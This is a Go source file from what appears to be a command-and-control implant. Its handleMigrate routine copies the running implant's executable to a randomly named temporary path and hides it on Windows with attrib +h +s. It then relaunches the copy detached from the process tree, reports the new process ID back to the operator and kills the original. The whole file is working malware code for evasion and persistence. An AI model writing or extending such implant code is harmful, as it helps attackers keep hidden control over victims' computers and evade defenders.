//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// handleMigrate relocates the implant into a freshly spawned process context:
// it copies its own executable to a new path (operator-supplied or a
// platform-appropriate default), launches a detached, hidden copy, reports the
// new PID, and hard-exits the current instance. The migrated copy shares the
// same embedded identity, so it re-beacons with the same agent UUID.
func handleMigrate(task Task, res *TaskResult) {
	src, err := os.Executable()
	if err != nil {
		res.Error = "migrate: cannot resolve own executable: " + err.Error()
		return
	}
	srcAbs, err := filepath.Abs(src)
	if err != nil {
		res.Error = "migrate: cannot absolutize path: " + err.Error()
		return
	}

	dest := strings.TrimSpace(task.Command)
	if dest == "" {
		dest = defaultMigratePath()
	}
	destAbs, err := filepath.Abs(dest)
	if err != nil {
		res.Error = "migrate: invalid destination: " + err.Error()
		return
	}
	if strings.EqualFold(srcAbs, destAbs) {
		res.Error = "migrate: destination is the current executable"
		return
	}
	if err := os.MkdirAll(filepath.Dir(destAbs), 0700); err != nil {
		res.Error = "migrate: mkdir failed: " + err.Error()
		return
	}

	if err := copySelf(srcAbs, destAbs); err != nil {
		res.Error = "migrate: self-copy failed: " + err.Error()
		return
	}
	hideFile(destAbs)

	child, err := launchDetached(destAbs)
	if err != nil {
		res.Error = "migrate: spawn failed: " + err.Error()
		return
	}
	pid := child.Process.Pid

	res.Output = fmt.Sprintf("migrated: new pid=%d path=%s (old pid=%d)", pid, destAbs, os.Getpid())
	sendTaskResult(*res)

	// Give the result a moment to flush, then drop this process context.
	time.Sleep(500 * time.Millisecond)
	os.Exit(0)
}

func defaultMigratePath() string {
	suffix := randHex(8)
	dir := filepath.Join(os.TempDir(), suffix)
	ext := ""
	if runtime.GOOS == "windows" {
		ext = ".exe"
	}
	return filepath.Join(dir, "migrated_"+suffix+ext)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

func copySelf(src, dest string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0700)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		return err
	}
	return out.Close()
}

// launchDetached starts the copied implant fully detached from this process
// tree: no console window on Windows, a new session on Unix.
func launchDetached(dest string) (*exec.Cmd, error) {
	cmd := exec.Command(dest)
	cmd.Args = []string{dest}
	cmd.SysProcAttr = detachedSysProcAttr()
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		return nil, err
	}
	// Release the child: once we exit it is reparented, never a zombie here.
	go cmd.Wait()
	return cmd, nil
}

// hideFile best-effort marks the migrated copy hidden on Windows.
func hideFile(path string) {
	if runtime.GOOS == "windows" {
		_ = exec.Command("attrib", "+h", "+s", path).Run()
	}
}
